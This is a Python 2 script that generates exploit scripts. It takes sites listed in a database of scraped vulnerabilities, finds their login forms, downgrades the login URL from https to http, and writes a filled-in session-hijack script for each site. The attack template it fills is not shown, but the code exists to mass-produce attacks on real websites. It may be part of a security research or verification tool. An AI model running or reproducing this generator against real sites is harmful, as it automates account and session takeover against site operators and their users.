import requests
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker
from sqlalchemy import and_
from database.models import Vulnerabilities, Inputs
from urlparse import urlparse
from loginform import fill_login_form

def get_login_form_attributes(url):
	print url
	r = requests.get(url, verify=False)
	try:
		response = fill_login_form(url, r.text, "user", "pass")
		user_input_box_name = ''
		pass_input_box_name = ''
		for input_tuple in  response[0]:
			if input_tuple[1] == 'user':
				user_input_box_name = input_tuple[0]
			if input_tuple[1] == 'pass':
				pass_input_box_name = input_tuple[0]
	except:
		print('\033[91m Cannot parse form... Skipping exploit... \033[0m')
		return ('', '')

	return (user_input_box_name, pass_input_box_name)

# Start exploit script generation
print('\033[94m ################################## \033[0m')
print('\033[94m ### Generating exploit scripts ###\033[0m')
print('\033[94m ################################## \033[0m')

engine = create_engine('sqlite:///database/scrapedsites.sqlite')
Session = sessionmaker(bind=engine)
session = Session()
exploit_count = 0

for vuln in session.query(Vulnerabilities).order_by(Vulnerabilities.scan_date):
	domain = '{uri.scheme}://{uri.netloc}'.format(uri=urlparse(vuln.url))

	result = session.query(Inputs).filter(and_(Inputs.url.like('%' + domain + '%'), Inputs.type_attr == 'password'))
	
	for exploit in result.all():
		if 'register' in exploit.url or 'signup' in exploit.url:
			continue

		login_form_attr = get_login_form_attributes(exploit.url)

		if login_form_attr[0] == '' or login_form_attr[1] == '':
			continue

		with open('verifier/templates/session_hijack_template.txt', 'r') as myfile:
			print('Enter username for ' + domain + ':')
			username = raw_input()
			print('Enter password for ' + domain + ':')
			password = raw_input()

			data = myfile.read()
			data = data.replace('<<login_page_url>>', exploit.url.replace('https', 'http'))
			data = data.replace('<<home_url>>', domain)
			data = data.replace('<<user_input>>', login_form_attr[0])
			data = data.replace('<<pass_input>>', login_form_attr[1])
			data = data.replace('<<username>>', username)
			data = data.replace('<<password>>', password)

			exploit_script = open("exploit_scripts/" + str(exploit_count) + '-' + domain.replace('https://', '').replace('.com', '').replace('/', '') + '-' + vuln.vulnerability_type + '.py', "w")
			exploit_script.write(data)
			exploit_script.close()
			exploit_count += 1
			print('\033[92m Created exploit for: ' + domain +' \033[0m')